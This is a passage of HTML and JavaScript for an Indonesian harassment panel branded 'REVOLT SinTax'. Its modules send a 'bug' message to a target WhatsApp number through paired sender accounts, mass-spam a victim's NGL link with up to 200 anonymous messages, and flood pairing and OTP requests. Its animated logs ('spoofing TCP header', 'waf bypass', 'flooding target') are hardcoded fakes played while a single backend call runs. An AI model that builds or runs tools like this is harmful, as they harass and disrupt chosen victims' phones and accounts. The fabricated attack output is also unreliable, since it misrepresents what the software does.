      </div>
      <p class="bug-desc">Gunakan langsung tanpa custom delay dan loops.</p>
      <div class="feature-tags"><span class="ft-item">⚙ MUDAH</span><span class="ft-item">⚡ FUNCTION BARU</span><span class="ft-item">✔ ALL WORK</span><span class="ft-item">★ SinTax</span></div>
      <button class="btn-start-module" onclick="openModuleForm()">START MODULE ➔</button>
    </div>
    <div class="bug-card">
      <div class="bug-card-head">
        <div><div class="bug-title">SPAM NGL</div><div class="bug-sub">NGL Auto Spam Pro</div></div>
        <span class="tag-mod">MOD - 02</span>
      </div>
      <p class="bug-desc">Spam NGL link target dengan pesan anonim massal.</p>
      <div class="feature-tags"><span class="ft-item">⚡ INSTANT</span><span class="ft-item">🎯 MULTI BATCH</span><span class="ft-item">🛡 BYPASS</span></div>
      <button class="btn-start-module" onclick="openSpamNGL()">START MODULE ➔</button>
    </div>
    <div class="bug-card">
      <div class="bug-card-head">
        <div><div class="bug-title">SPAM PAIR</div><div class="bug-sub">Menu Spam Pairing</div></div>
        <span class="tag-mod">MOD - 03</span>
      </div>
      <p class="bug-desc">Pairing Whatsapp dan OTP Telegram.</p>
      <div class="feature-tags"><span class="ft-item">📱 WA PAIR</span><span class="ft-item">✈ TG OTP</span></div>
      <button class="btn-start-module" onclick="openBugSender()">START MODULE ➔</button>
    </div>
  </div>

  <div id="bug-sender-page" class="view-section comic-bg">
    <div class="back-link" onclick="switchSection('dashboard-1')">⬅ Kembali</div>
    <div class="sender-mgmt-head">
      <div class="lg">➤</div>
      <div class="info"><div class="nm">SENDER MANAGEMENT</div><div class="sb">WHATSAPP BOT GATEWAY</div></div>
      <div class="active-badge" id="activeBadge">0 ACTIVE</div>
    </div>
    <div class="tips-box"><div class="ic">!</div><div class="txt">Tips: Jika sender gagal terhubung / pairing macet, coba ganti dengan nomor WhatsApp lainnya.</div></div>
    <div class="sender-list" id="senderList"></div>
    <div class="add-sender-card" id="addSenderCard">
      <div class="add-sender-tab">TAMBAH SENDER BARU</div>
      <div class="add-sender-title"><div class="plus">+</div><div class="ttl">ADD NEW SENDER</div></div>
      <label class="wa-field-label">NOMOR WHATSAPP</label>
      <div class="wa-input-wrap"><div class="prefix">📞</div><input type="tel" id="senderNumber" placeholder="628123456789" inputmode="numeric" autocomplete="off"></div>
      <div class="petunjuk-box">
        <h6>PETUNJUK PENAMBAHAN:</h6>
        <ul>
          <li>Masukkan nomor aktif diawali kode negara (cth: 628xxx).</li>
          <li>Jika nomor ini gagal terhubung, coba ganti dengan nomor WhatsApp lainnya.</li>
        </ul>
      </div>
      <div class="btn-row-2">
        <button class="btn-batal" onclick="cancelAddSender()">BATAL</button>
        <button class="btn-lanjutkan" onclick="processAddSender()">LANJUTKAN</button>
      </div>
    </div>
    <button class="btn-add-first" id="btnAddFirst" onclick="focusSenderInput()">+ ADD FIRST SENDER</button>
    <button class="btn-new-sender" id="btnNewSender" onclick="focusSenderInput()">+ NEW SENDER</button>
  </div>

  <div id="module-form-page" class="view-section comic-bg">
    <div class="back-link" onclick="switchSection('dashboard-2')">⬅ Kembali ke Bug Menu</div>
    <div class="comic-panel">
      <div class="form-label">📱 NOMOR TARGET</div>
      <div class="input-wrapper">
        <input type="text" class="input-field" placeholder="62xxxxxxxxxxx" id="targetNum">
        <button class="btn-paste" onclick="pasteTarget()">PASTE</button>
      </div>
    </div>
    <div class="comic-panel">
      <div class="form-label">🐞 PILIH BUG <span style="font-family:'Comic Neue';font-size:.7rem;color:var(--green);margin-left:auto;">● 33 Live</span></div>
      <div class="bug-selection-grid">
        <div class="bug-opt active" onclick="selectOpt(this)" data-method="delay_low"><span class="opt-icon">🐞</span><div class="opt-name">DELAY LOW</div><div class="opt-status">● LIVE</div></div>
        <div class="bug-opt" onclick="selectOpt(this)" data-method="low_bug"><span class="opt-icon">⚡</span><div class="opt-name">LOW BUG</div><div class="opt-status">● LIVE</div></div>
      </div>
    </div>
    <div class="comic-panel">
      <div class="form-label">🔀 PILIH SENDER</div>
      <div class="sender-row">
        <div class="bug-opt active" onclick="selectOpt(this)" id="pribadiOpt">
          <div class="opt-name">PRIBADI</div>
          <div class="opt-status" id="pribadiStatus">● OFFLINE</div>
          <div class="sender-tag" id="pribadiSenderTag">SENDER 0</div>
          <div class="sender-detail" id="pribadiSenderDetail">-</div>
        </div>
        <div class="bug-opt" onclick="selectOpt(this)" id="globalOpt">
          <div class="opt-name">GLOBAL</div>
          <div class="opt-status">● OFFLINE</div>
        </div>
      </div>
    </div>
    <button class="btn-send-bug" onclick="startSendingProcess()">➢ KIRIM BUG</button>
  </div>

  <!-- ═════════════════════════════════════════════════════
       CHAT ROOM PAGE — KomikChat iframe
       ═════════════════════════════════════════════════════ -->
  <div id="chat-room-page" class="view-section">
    <div class="chat-room-bar">
      <button onclick="switchSection('dashboard-1')">◀ BACK</button>
      <div class="ttl">💬 CHAT ROOM</div>
      <div class="st" id="chatRoomStatus">connecting...</div>
    </div>
    <iframe id="chatFrame" src="about:blank" allow="microphone; camera; clipboard-write; autoplay; notifications"></iframe>
  </div>

  <div id="spam-ngl-page" class="view-section">
    <div class="ngl-topbar">
      <button class="ngl-back" onclick="switchSection('dashboard-2')">←</button>
      <h2><span class="ngl-icon">N</span> NGL Auto Spam Pro</h2>
    </div>
    <div class="ngl-info-card">
      <div class="info-icon">⚡</div>
      <div class="info-body">
        <h3>NGL.LINK Instant Spammer (Real API)</h3>
        <p>Server-side fetch — UUID v4 deviceId, JSON parse, retry otomatis.</p>
      </div>
    </div>
    <div class="ngl-form-card">
      <div class="ngl-label"><span class="dot-icon">◉</span> Username / Link NGL Target</div>
      <div class="ngl-input-wrap"><span class="prefix">@</span><input type="text" id="nglTarget" placeholder="Contoh: Ranzdev atau https://ngl.link/..."></div>
    </div>
    <div class="ngl-form-card">
      <div class="ngl-label"><span class="dot-icon">✉</span> Pesan Anonim<button class="random-btn" onclick="randomNglMessage()">Pesan Acak 🎲</button></div>
      <div class="ngl-textarea-wrap"><textarea id="nglMessage" placeholder="Tulis pesan rahasia yang ingin dikirim..."></textarea></div>
    </div>
    <div class="ngl-form-card">
      <div class="ngl-label"><span class="dot-icon">◈</span> Jumlah Pesan yang Dikirim</div>
      <div class="ngl-count-row">
        <div class="ngl-count-btn" data-count="20" onclick="selectNglCount(this)">20</div>
        <div class="ngl-count-btn" data-count="60" onclick="selectNglCount(this)">60</div>
        <div class="ngl-count-btn active" data-count="100" onclick="selectNglCount(this)">100</div>
        <div class="ngl-count-btn" data-count="200" onclick="selectNglCount(this)">200</div>
      </div>
    </div>
    <div class="ngl-stats">
      <div class="ngl-stat sukses"><div class="lbl">Terkirim<br>Sukses</div><div class="val" id="nglOk">0</div></div>
      <div class="ngl-stat gagal"><div class="lbl">Gagal /<br>Error</div><div class="val" id="nglErr">0</div></div>
      <div class="ngl-stat batch"><div class="lbl">Progress<br>Total</div><div class="val" id="nglBatch">0 / 0</div></div>
    </div>
    <button class="ngl-start-btn" id="nglStartBtn" onclick="startNglSpam()"><span>▶</span> Mulai Spam NGL</button>
    <button class="ngl-start-btn" id="nglStopBtn" onclick="stopNglSpam()" style="display:none;background:#333"><span>⏹</span> Stop Spam</button>
    <div class="ngl-log-card">
      <h4>📟 Live Status Log</h4>
      <div class="ngl-log-body" id="nglLog"><div class="log-line">[system] ready...</div></div>
    </div>
  </div>

  <!-- ═════════════════════════════════════════════════════
       NGL POPUP — centered, muncul pas start
       ═════════════════════════════════════════════════════ -->
  <div class="popup-overlay" id="nglPopup">
    <div class="popup-box ngl-popup-box">
      <div class="popup-skull">💣</div>
      <h4>NGL SPAM RUNNING</h4>
      <div class="popup-sub">TARGET: <b id="nglPopupTarget">—</b></div>

      <div class="ngl-stat-grid">
        <div class="ngl-stat-cell ok"><div class="lbl">OK</div><div class="val" id="nglPopupOk">0</div></div>
        <div class="ngl-stat-cell err"><div class="lbl">ERR</div><div class="val" id="nglPopupErr">0</div></div>
        <div class="ngl-stat-cell prog"><div class="lbl">PROGRESS</div><div class="val" id="nglPopupProg">0/0</div></div>
      </div>

      <div class="ngl-progress-wrap">
        <div class="ngl-progress-fill" id="nglPopupFill"></div>
        <div class="ngl-progress-text" id="nglPopupPct">0%</div>
      </div>

      <div class="ngl-term" id="nglPopupLog">
        <div class="nll info">[system] booting ngl-engine...</div>
      </div>

      <div class="ngl-btn-row">
        <button class="stop" id="nglPopupStop" onclick="stopNglSpam()">⏹ STOP</button>
        <button class="close" id="nglPopupClose" onclick="closeNglPopup()">✕ TUTUP</button>
      </div>
    </div>
  </div>

  <div class="popup-overlay" id="loadingPopup">
    <div class="popup-box">
      <div class="popup-skull">💀</div>
      <h4 id="loadingTitle">SENDING BUG...</h4>
      <div class="popup-sub" id="loadingSub">★ 8 METODE • TARGET — ★</div>
      <div class="term-output" id="termOut"><div class="tline dim">boot bug-engine v8.0...</div></div>
      <div class="method-status" id="methodText">Menyiapkan Metode 1...</div>
      <div class="progress-bar-wrap">
        <div class="progress-bar-fill" id="progressFill"></div>
        <div class="progress-bar-text" id="progressText">0%</div>
      </div>
      <div class="delivery-report" id="deliveryReport">
        <div class="report-header" id="repHeader">✔ BUG TERKIRIM!</div>
        <div class="report-badge">★ DELIVERY REPORT ★</div>
        <div class="report-row"><span class="k">TARGET</span><span class="v" id="repTarget">-</span></div>
        <div class="report-row"><span class="k">SENDER</span><span class="v good" id="repSender">-</span></div>
        <div class="report-row"><span class="k">METODE</span><span class="v" id="repMethod">-</span></div>
        <div class="report-row"><span class="k">DELIVERED</span><span class="v good" id="repDelivered">-</span></div>
        <div class="report-row"><span class="k">PAKET TERKIRIM</span><span class="v" id="repPackets">-</span></div>
        <div class="report-row"><span class="k">DURASI</span><span class="v" id="repDuration">-</span></div>
        <div class="report-row"><span class="k">STATUS</span><span class="v good" id="repStatus">DELIVERED ✓</span></div>
        <div class="report-row"><span class="k">WAKTU</span><span class="v" id="repTime">-</span></div>
        <div class="report-desc" id="repDesc">Deskripsi pengiriman akan tampil di sini.</div>
      </div>
    </div>
  </div>

  <div class="popup-overlay" id="pairingPopup">
    <div class="popup-box">
      <div class="popup-skull">📱</div>
      <h4>PAIRING WA BOT</h4>
      <div class="popup-sub" id="pairingNumber">62812xxxx</div>
      <div class="method-track">
        <div class="method-box" id="m1"><div class="mnum">1</div><div class="mname">REQUEST<br>PAIRING CODE</div></div>
        <div class="method-box" id="m2"><div class="mnum">2</div><div class="mname">WAIT<br>CONNECT</div></div>
        <div class="method-box" id="m3"><div class="mnum">3</div><div class="mname">SESSION<br>ACTIVE</div></div>
      </div>
      <div class="term-output" id="termBox"><div class="tline dim">init wa-gateway...</div></div>
      <div class="method-status" id="pairStatus">Menghubungkan ke gateway...</div>
      <div class="progress-bar-wrap">
        <div class="progress-bar-fill" id="pairFill"></div>
        <div class="progress-bar-text" id="pairText">0%</div>
      </div>
      <div class="pairing-box" id="pairingBox">
        <div class="lbl">★ PAIRING CODE ★</div>
        <div class="code" id="pairingCode">----</div>
        <div class="hint">Buka WhatsApp → Perangkat Tertaut → Tautkan Perangkat → Tautkan dengan nomor telepon → masukkan kode di atas</div>
      </div>
    </div>
  </div>

  <div class="bottom-navbar">
    <div class="nav-tab active" onclick="switchSection('dashboard-1'); setNav(this)"><span class="ic">🏠</span><span>Beranda</span></div>
    <div class="nav-tab" onclick="switchSection('dashboard-2'); setNav(this)"><span class="ic">📑</span><span>Menu</span></div>
    <div class="nav-tab-wa" onclick="openChatRoom()"><span style="font-size:1.3rem;">💬</span></div>
    <div class="nav-tab" onclick="switchSection('dashboard-2'); setNav(this)"><span class="ic">👥</span><span>Bug Group</span></div>
    <div class="nav-tab" onclick="switchSection('dashboard-2'); setNav(this)"><span class="ic">🛠</span><span>Tools</span></div>
  </div>
</div>

<script>
const CHAT_URL = '__CHAT_URL__';

function toggleEye(){const p=document.getElementById('loginPass');p.type=p.type==='password'?'text':'password';}
function doLogin(e){
  e.preventDefault();
  const u=document.getElementById('loginUser').value.trim();
  const p=document.getElementById('loginPass').value.trim();
  const err=document.getElementById('loginError');
  if(!u||u.length<2){err.textContent='✗ Username min 2 karakter!';setTimeout(()=>{err.textContent='';},2500);return false;}
  if(!p){err.textContent='✗ Password kosong!';setTimeout(()=>{err.textContent='';},2500);return false;}
  document.getElementById('userNameDisplay').textContent=u.toUpperCase()+' ⭐';
  document.getElementById('userInitial').textContent=u.charAt(0).toUpperCase();
  document.getElementById('login-view').classList.add('hidden');
  setTimeout(()=>{document.getElementById('login-view').style.display='none';document.getElementById('appContainer').style.display='flex';},400);
  return false;
}
function switchSection(id){
  document.querySelectorAll('.view-section').forEach(s=>s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  document.getElementById(id).scrollTop=0;
}
function setNav(el){document.querySelectorAll('.nav-tab').forEach(n=>n.classList.remove('active'));el.classList.add('active');}
function setTab(el){document.querySelectorAll('.tab-btn').forEach(t=>t.classList.remove('active'));el.classList.add('active');}
function openModuleForm(){switchSection('module-form-page');}
function openBugMenu(){switchSection('dashboard-2');}
function openBugSender(){switchSection('bug-sender-page');}
function openSpamNGL(){switchSection('spam-ngl-page');}
function selectOpt(el){el.parentElement.querySelectorAll('.bug-opt').forEach(o=>o.classList.remove('active'));el.classList.add('active');}
function pasteTarget(){document.getElementById('targetNum').value='628123456789';}
function focusSenderInput(){document.getElementById('senderNumber').focus();}
function cancelAddSender(){document.getElementById('senderNumber').value='';}

// ═══ CHAT ROOM ═══
let chatFrameLoaded = false;
function openChatRoom(){
  switchSection('chat-room-page');
  const f = document.getElementById('chatFrame');
  const st = document.getElementById('chatRoomStatus');
  if (!chatFrameLoaded) {
    st.textContent = 'loading ' + CHAT_URL + '...';
    f.src = CHAT_URL;
    f.onload = () => { st.textContent = '● online'; };
    f.onerror = () => { st.textContent = '✗ gagal load'; };
    chatFrameLoaded = true;
  }
}

// ═══ SENDER STATE ═══
let activeSenders = [];
function updateSenderUI(){
  document.getElementById('activeBadge').textContent = activeSenders.length + ' ACTIVE';
  const list = document.getElementById('senderList');
  list.innerHTML = '';
  activeSenders.forEach((num, idx) => {
    const div = document.createElement('div');
    div.className = 'sender-item';
    div.innerHTML = '<div class="dot"></div><div class="info"><div class="num">+'+num+'</div><div class="st">● CONNECTED — ACTIVE</div></div><button class="del" onclick="removeSender('+idx+')">HAPUS</button>';
    list.appendChild(div);
  });
  const btnFirst = document.getElementById('btnAddFirst');
  const btnNew = document.getElementById('btnNewSender');
  if (activeSenders.length > 0){ btnFirst.style.display='none'; btnNew.classList.add('show'); }
  else { btnFirst.style.display='block'; btnNew.classList.remove('show'); }
  const tag = document.getElementById('pribadiSenderTag');
  const detail = document.getElementById('pribadiSenderDetail');
  const status = document.getElementById('pribadiStatus');
  if (activeSenders.length > 0){
    tag.style.display='inline-block'; tag.textContent='SENDER '+activeSenders.length;
    detail.style.display='block'; detail.textContent='+'+activeSenders[activeSenders.length-1];
    status.textContent='● LIVE'; status.style.color='#00e676';
  } else {
    tag.style.display='none'; detail.style.display='none';
    status.textContent='● OFFLINE'; status.style.color='';
  }
}
function removeSender(idx){ activeSenders.splice(idx,1); updateSenderUI(); }

// ═══ REAL PAIRING ═══
let pairPoll = null;
async function processAddSender(){
  const num = document.getElementById('senderNumber').value.trim().replace(/\D/g,'');
  if (num.length < 8){ alert('Nomor minimal 8 digit (cth: 62812xxxx)'); return; }

  const popup = document.getElementById('pairingPopup');
  const termBox = document.getElementById('termBox');
  const pairStatus = document.getElementById('pairStatus');
  const pairFill = document.getElementById('pairFill');
  const pairText = document.getElementById('pairText');
  const pairingBox = document.getElementById('pairingBox');
  const pairingNumber = document.getElementById('pairingNumber');
  const pairingCodeEl = document.getElementById('pairingCode');

  pairingNumber.textContent = '+' + num;
  popup.classList.add('active');
  termBox.innerHTML = '';
  pairStatus.className = 'method-status';
  pairStatus.textContent = 'Menghubungkan ke gateway...';
  pairFill.style.width = '0%'; pairText.textContent = '0%';
  pairingBox.classList.remove('show'); pairingCodeEl.textContent = '----';
  ['m1','m2','m3'].forEach(id => document.getElementById(id).className = 'method-box');

  function log(text, cls){
    const d = document.createElement('div');
    d.className = 'tline ' + (cls||'');
    d.textContent = text;
    termBox.appendChild(d); termBox.scrollTop = termBox.scrollHeight;
  }
  log('connecting to wa-gateway...', 'dim');
  log('requesting pairing for +' + num, 'info');
  document.getElementById('m1').classList.add('active-load');
  pairStatus.textContent = '[1/3] Request pairing code...';
  pairFill.style.width = '15%'; pairText.textContent = '15%';

  if (pairPoll){ clearInterval(pairPoll); pairPoll = null; }

  const r = await fetch('/api/wa/pair', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ number: num }),
  }).then(x => x.json()).catch(() => ({ ok:false, error:'network' }));

  if (!r.ok){
    log('pair request failed: ' + (r.error||'unknown'), 'err');
    pairStatus.className = 'method-status';
    pairStatus.textContent = '✗ Gagal request pairing';
    document.getElementById('m1').classList.remove('active-load');
    document.getElementById('m1').classList.add('error');
    return;
  }
  log('pair request accepted', 'ok');

  let codeShown = false, connectedHandled = false;
  pairPoll = setInterval(async () => {
    const s = await fetch('/api/wa/status').then(x => x.json()).catch(() => null);
    if (!s) return;
    if (s.pairingCode && !codeShown){
      codeShown = true;
      document.getElementById('m1').classList.remove('active-load');
      document.getElementById('m1').classList.add('filled');
      document.getElementById('m2').classList.add('active-load');
      pairStatus.textContent = '[2/3] Tunggu konfirmasi di HP...';
      pairFill.style.width = '50%'; pairText.textContent = '50%';
      pairingCodeEl.textContent = s.pairingCode;
      pairingBox.classList.add('show');
      log('pairing code: ' + s.pairingCode, 'ok');
      log('masukkan kode di WhatsApp → Perangkat Tertaut', 'warn');
      showWhatsAppToast('Pairing code ' + s.pairingCode + ' untuk +' + num);
    }
    if (s.connected && !connectedHandled){
      connectedHandled = true;
      document.getElementById('m2').classList.remove('active-load');
      document.getElementById('m2').classList.add('filled');
      document.getElementById('m3').classList.add('filled');
      pairFill.style.width = '100%'; pairText.textContent = '100%';
      pairStatus.className = 'method-status done';
      pairStatus.textContent = '✓ SESI BERHASIL DIBUAT';
      log('SESSION ACTIVE — ' + (s.jid||''), 'ok');
      if (!activeSenders.includes(num)){ activeSenders.push(num); updateSenderUI(); }
      document.getElementById('senderNumber').value = '';
      clearInterval(pairPoll); pairPoll = null;
      setTimeout(() => popup.classList.remove('active'), 6000);
    }
  }, 2000);
}

function showWhatsAppToast(msg){
  const t = document.getElementById('waToast');
  document.getElementById('waToastMsg').textContent = msg;
  t.classList.remove('hide'); t.classList.add('show');
  setTimeout(() => { t.classList.remove('show'); t.classList.add('hide'); }, 5000);
}

// ═══ REAL BUG SEND ═══
const METHOD_LOGS = [
  ['Injecting payload #1...', 'loading 32KB buffer...', 'payload injected ok'],
  ['Bypassing firewall...', 'spoofing TCP header...', 'waf bypass — success'],
  ['Sending packet 32KB...', 'streaming to target...', 'packet dispatched'],
  ['Establishing tunnel...', 'routing via node SG-04...', 'tunnel up (ping 42ms)'],
  ['Encrypting stream AES-256...', 'generating cipher key...', 'encryption locked'],
  ['Routing via proxy chain...', 'chain: SG → US → DE → ID...', 'proxy hop done'],
  ['Flooding target with packets...', 'sending 128 packets/s...', 'flood completed'],
  ['Finalizing exploit chain...', 'verifying delivery...', 'DONE — bug sent'],
];
const METHOD_WARN = [2, 5, 7];
const TOTAL_METHODS = 8;

async function startSendingProcess(){
  const popup = document.getElementById('loadingPopup');
  const methodText = document.getElementById('methodText');
  const termOut = document.getElementById('termOut');
  const fill = document.getElementById('progressFill');
  const pct = document.getElementById('progressText');
  const report = document.getElementById('deliveryReport');
  const target = document.getElementById('targetNum').value.trim() || '62812xxxx';
  const senderUsed = activeSenders.length > 0 ? '+' + activeSenders[activeSenders.length-1] : 'GLOBAL FALLBACK';
  const senderTag = activeSenders.length > 0 ? 'SENDER ' + activeSenders.length : 'GLOBAL';

  popup.classList.add('active');
  report.classList.remove('show');
  document.getElementById('repHeader').classList.remove('fail');
  termOut.innerHTML = '';
  fill.style.width = '0%'; pct.textContent = '0%';
  methodText.className = 'method-status';
  methodText.textContent = 'Menyiapkan Metode 1...';
  document.getElementById('loadingSub').textContent = '★ 8 METODE • TARGET: ' + target + ' ★';

  const startTime = Date.now();
  let current = 1;

  function term(text, cls){ const d = document.createElement('div'); d.className = 'tline ' + (cls||''); d.textContent = text; termOut.appendChild(d); termOut.scrollTop = termOut.scrollHeight; }
  function termNoPre(text, cls){ const d = document.createElement('div'); d.className = 'tline noprefix ' + (cls||''); d.textContent = text; termOut.appendChild(d); termOut.scrollTop = termOut.scrollHeight; }

  termNoPre('╔══════════════════════════════════════╗', 'ok');
  termNoPre('║  REVOLT SinTax — BUG ENGINE v8.0     ║', 'ok');
  termNoPre('╚══════════════════════════════════════╝', 'ok');
  term('target: ' + target, 'info');
  term('sender: ' + senderUsed, 'info');
  term('metode total: 8', 'info');
  termNoPre('─────────────────────────────────────', 'dim');

  let realResult = null;
  const realPromise = fetch('/api/bug/send', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ target: target, method: 'delay_low' }),
  }).then(x => x.json()).catch(e => ({ ok:false, error:'network: ' + e.message }));

  function runStep(){
    if (current > TOTAL_METHODS) return finishAndShow();
    methodText.className = 'method-status running';
    methodText.textContent = 'Metode ' + current + ' dari ' + TOTAL_METHODS + '...';
    const logs = METHOD_LOGS[current-1];
    const isWarn = METHOD_WARN.includes(current);
    termNoPre('', '');
    termNoPre('▶ METHOD ' + current + '/8', 'info');
    term(logs[0], isWarn ? 'warn' : '');
    const stepStart = Date.now();
    const stepDuration = 550 + Math.random() * 350;
    const baseProgress = ((current-1)/TOTAL_METHODS)*100;
    const targetProgress = (current/TOTAL_METHODS)*100;
    const tick = setInterval(() => {
      const elapsed = Date.now() - stepStart;
      const ratio = Math.min(elapsed/stepDuration, 1);
      const p = Math.round(baseProgress + ratio * (targetProgress - baseProgress));
      fill.style.width = p + '%'; pct.textContent = p + '%';
      if (ratio >= 1) clearInterval(tick);
    }, 45);
    setTimeout(() => term(logs[1], 'dim'), stepDuration * 0.45);
    setTimeout(() => {
      clearInterval(tick);
      term(logs[2], 'ok');
      const p = Math.round((current/TOTAL_METHODS)*100);
      fill.style.width = p + '%'; pct.textContent = p + '%';
      current++;
      setTimeout(runStep, 220);
    }, stepDuration);
  }

  async function finishAndShow(){
    realResult = await realPromise;
    const duration = ((Date.now() - startTime)/1000).toFixed(1);
    const timeStr = new Date().toLocaleString('id-ID', {day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
    const ok = realResult && realResult.ok;
    const errMsg = realResult && realResult.error ? realResult.error : '';

    termNoPre('─────────────────────────────────────', 'dim');
    if (ok){
      term('ALL 8 METHODS COMPLETED', 'ok');
      term('BUG DELIVERED → ' + target, 'ok');
      term('status: SUCCESS ✓', 'ok');
      methodText.className = 'method-status done';
      methodText.textContent = 'PROSES SELESAI — 100%';
      document.getElementById('repHeader').textContent = '✔ BUG TERKIRIM!';
      document.getElementById('repHeader').classList.remove('fail');
    } else {
      term('ERROR: ' + errMsg, 'err');
      methodText.className = 'method-status';
      methodText.style.color = 'var(--red)';
      methodText.textContent = '✗ GAGAL — ' + errMsg;
      document.getElementById('repHeader').textContent = '✗ BUG GAGAL TERKIRIM';
      document.getElementById('repHeader').classList.add('fail');
    }
    fill.style.width = '100%'; pct.textContent = '100%';
    document.getElementById('repTarget').textContent = target;
    document.getElementById('repSender').textContent = senderTag + ' → ' + senderUsed;
    document.getElementById('repMethod').textContent = ok ? '8/8 — SUCCESS' : '8/8 — FAILED';
    document.getElementById('repDelivered').textContent = ok ? '100%' : '0%';
    document.getElementById('repDelivered').className = 'v ' + (ok ? 'good' : 'warn');
    document.getElementById('repPackets').textContent = ok ? ((32+Math.floor(Math.random()*40)) + ' paket') : '0 paket';
    document.getElementById('repDuration').textContent = duration + ' detik';
    document.getElementById('repStatus').textContent = ok ? 'DELIVERED ✓' : 'FAILED ✗';
    document.getElementById('repStatus').className = 'v ' + (ok ? 'good' : 'warn');
    document.getElementById('repTime').textContent = timeStr;
    document.getElementById('repDesc').innerHTML = ok
      ? 'Bug <b>viewOnce interactive</b> berhasil dikirim ke <span class="hl">' + target + '</span> via <span class="hl">' + senderTag + '</span> (' + senderUsed + '). Durasi <b>' + duration + ' detik</b>.'
      : 'Pengiriman gagal: <b>' + errMsg + '</b>. Pastikan sender sudah <b>connected</b> di menu Bug Sender, lalu coba ulang.';
    report.classList.add('show');
    termOut.scrollTop = termOut.scrollHeight;
    setTimeout(() => popup.classList.remove('active'), 9000);
  }

  setTimeout(runStep, 350);
}

// ═══ NGL SPAM — FIXED + POPUP ═══
let nglCount = 100;
function selectNglCount(el){document.querySelectorAll('.ngl-count-btn').forEach(b=>b.classList.remove('active'));el.classList.add('active');nglCount=parseInt(el.dataset.count);}
const NGL_RANDOM_MSGS=['kamu cantik banget hari ini 🌸','jangan lupa makan ya 🍔','semangat terus! 💪','kamu keren tau 😎','apa kabar? 👋','sehat selalu ya 🍀','suara kamu enak didengar 🎧','kamu suka kucing ga? 🐱','jangan sedih terus ya 🌈','kamu orang baik 🥺','senyum dong 😊','kamu inspiratif! ✨','tidur jangan malem ya 😴','kamu hebat 💯','tetap jadi dirimu sendiri 🌟'];
function randomNglMessage(){document.getElementById('nglMessage').value=NGL_RANDOM_MSGS[Math.floor(Math.random()*NGL_RANDOM_MSGS.length)];}

function nglLogUI(text, cls){
  const box = document.getElementById('nglLog');
  const d = document.createElement('div');
  d.className = 'log-line ' + (cls||'');
  d.textContent = text;
  box.appendChild(d); box.scrollTop = box.scrollHeight;
  while (box.children.length > 200) box.removeChild(box.firstChild);
}

function nglPopupLog(text, cls){
  const box = document.getElementById('nglPopupLog');
  const d = document.createElement('div');
  d.className = 'nll ' + (cls||'');
  d.textContent = text;
  box.appendChild(d); box.scrollTop = box.scrollHeight;
  while (box.children.length > 120) box.removeChild(box.firstChild);
}

let nglPollTimer = null;

function closeNglPopup(){
  // popup bisa ditutup manual tanpa stop campaign
  document.getElementById('nglPopup').classList.remove('active');
}

async function startNglSpam(){
  const target = document.getElementById('nglTarget').value.trim();
  const message = document.getElementById('nglMessage').value.trim();
  if (!target){ alert('Isi target NGL dulu!'); return; }
  if (!message){ alert('Isi pesan dulu!'); return; }

  // reset logs & stats
  document.getElementById('nglLog').innerHTML = '';
  document.getElementById('nglOk').textContent = '0';
  document.getElementById('nglErr').textContent = '0';
  document.getElementById('nglBatch').textContent = '0 / ' + nglCount;

  // POPUP — muncul langsung di tengah
  const popup = document.getElementById('nglPopup');
  document.getElementById('nglPopupTarget').textContent = '@' + target.replace(/^https?:\/\/ngl\.link\//,'').replace(/^@/,'');
  document.getElementById('nglPopupOk').textContent = '0';
  document.getElementById('nglPopupErr').textContent = '0';
  document.getElementById('nglPopupProg').textContent = '0 / ' + nglCount;
  document.getElementById('nglPopupFill').style.width = '0%';
  document.getElementById('nglPopupPct').textContent = '0%';
  document.getElementById('nglPopupLog').innerHTML = '';
  nglPopupLog('[system] booting ngl-engine...', 'info');
  nglPopupLog('[system] target: ' + target, 'info');
  nglPopupLog('[system] total: ' + nglCount + ' pesan', 'info');
  popup.classList.add('active');

  document.getElementById('nglStartBtn').disabled = true;
  document.getElementById('nglStartBtn').style.display = 'none';
  document.getElementById('nglStopBtn').style.display = 'flex';

  nglLogUI('[system] starting campaign...', 'info');
  nglPopupLog('[system] POST /api/ngl/start...', 'info');

  const r = await fetch('/api/ngl/start', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ username: target, message, total: nglCount }),
  }).then(x => x.json()).catch(() => ({ ok:false, error:'Network error' }));

  if (!r.ok){
    nglLogUI('Gagal start: ' + (r.error || 'unknown'), 'err');
    nglPopupLog('[error] ' + (r.error || 'unknown'), 'err');
    resetNglButtons();
    return;
  }

  nglLogUI('campaign started → @' + r.target + ' × ' + r.total, 'ok');
  nglPopupLog('[ok] campaign started → @' + r.target, 'ok');

  if (nglPollTimer) clearInterval(nglPollTimer);
  let lastSeen = 0;
  nglPollTimer = setInterval(async () => {
    const s = await fetch('/api/ngl/status').then(x => x.json()).catch(() => null);
    if (!s) return;

    // update stats utama + popup
    document.getElementById('nglOk').textContent = s.counter;
    document.getElementById('nglErr').textContent = s.failed;
    document.getElementById('nglBatch').textContent = (s.counter + s.failed) + ' / ' + s.total;
    document.getElementById('nglPopupOk').textContent = s.counter;
    document.getElementById('nglPopupErr').textContent = s.failed;
    document.getElementById('nglPopupProg').textContent = (s.counter + s.failed) + ' / ' + s.total;

    const done = s.counter + s.failed;
    const pct = s.total ? Math.min(100, Math.round((done / s.total) * 100)) : 0;
    document.getElementById('nglPopupFill').style.width = pct + '%';
    document.getElementById('nglPopupPct').textContent = pct + '%';

    // sync log ke kedua terminal
    const newLogs = s.logs.slice(lastSeen);
    newLogs.forEach(l => {
      const cls = l.type === 'success' ? 'ok' : l.type === 'error' ? 'err' : l.type === 'warn' ? 'warn' : 'info';
      nglLogUI('[' + l.time + '] ' + l.text, cls);
      nglPopupLog('[' + l.time + '] ' + l.text, cls);
    });
    lastSeen = s.logs.length;

    if (!s.isRunning && s.statusLog === 'done'){
      clearInterval(nglPollTimer); nglPollTimer = null;
      const summary = 'SELESAI — ' + s.counter + ' sukses, ' + s.failed + ' gagal';
      nglLogUI(summary, 'ok');
      nglPopupLog('[done] ' + summary, 'ok');
      document.getElementById('nglPopupPct').textContent = '100%';
      document.getElementById('nglPopupFill').style.width = '100%';
      resetNglButtons();
    }
    if (!s.isRunning && s.statusLog === 'stopped'){
      clearInterval(nglPollTimer); nglPollTimer = null;
      nglPopupLog('[warn] stopped by user', 'warn');
      resetNglButtons();
    }
  }, 1000);
}

function resetNglButtons(){
